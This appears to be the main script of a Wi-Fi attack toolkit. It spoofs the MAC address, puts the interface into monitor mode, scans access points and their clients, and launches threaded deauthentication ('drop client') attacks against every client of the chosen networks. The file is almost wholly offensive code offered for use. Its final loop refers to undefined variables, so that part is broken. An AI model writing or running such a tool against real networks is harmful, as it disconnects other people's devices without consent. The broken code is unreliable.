import threading
import time

import utils as u
from Interface import Interface
from WiFiToolBox import Operator
from AccessPoint import AccessPoint
from Client import Client

"""
. check packages
0. change mac address
1. switch to monitor mode
2. specify target(s)
3. scan APs
4. scan clients
5. drop clients

"""
iface = Interface()

def drop_client_thread(client_mac, ap_bssid, iface_name, channel):
    iface.set_active_channel(channel)
    Operator.drop_client(client_mac, ap_bssid, iface_name, 0)
    time.sleep(3)
    
    
def main():
    # Make the program ready to run.
    u.initialize(iface)
    now = time.strftime("%d%m%Y_%H%M%S")
    # Detect all APs
    fname = u.create_scan_folder(now)
    detected_aps = Operator.detect_access_points(iface.name, fname)
    time.sleep(1)
    detected_aps = AccessPoint.from_csv(f"{fname}-01.kismet.csv", sort_by_signal_level=True)
    

    # List all APs
    u.list_avliable_aps(detected_aps)
    # Choose target AP.
    detected_aps = u.choose_target_ap(detected_aps)


    # Detect all clients and set them to their connected AP 
    detected_clients = []
    for ap in detected_aps:
        fname = f"../scans/{now}/client_{ap.bssid.replace(':', '')}"
        clients = Operator.detect_clients(ap.channel, ap.bssid, iface.name, fname)
        clients = Client.from_csv(f"{fname}-01.csv")
        ap.clients = clients
        detected_clients.append(clients)


 

    threads = []

    for ap in detected_aps:
        u.show_available_clients(ap, iface)
        for client in ap.clients:
            thread = threading.Timer(3, drop_client_thread, args=(client.mac, ap.bssid, iface.name, ap.channel))
            threads.append(thread)
            thread.start()

    # Tüm thread'ların bitmesini bekleyin
    for thread in threads:
        thread.join()

    print("Tüm client'lar düşürüldü.")


    # Drop all clients from all APs
    for ap in detected_aps:
        u.show_available_clients(ap, iface)
        for client in ap.clients:
            drop_client_thread(client_mac, ap_bssid, iface_name)
        


if __name__ == "__main__":
    main()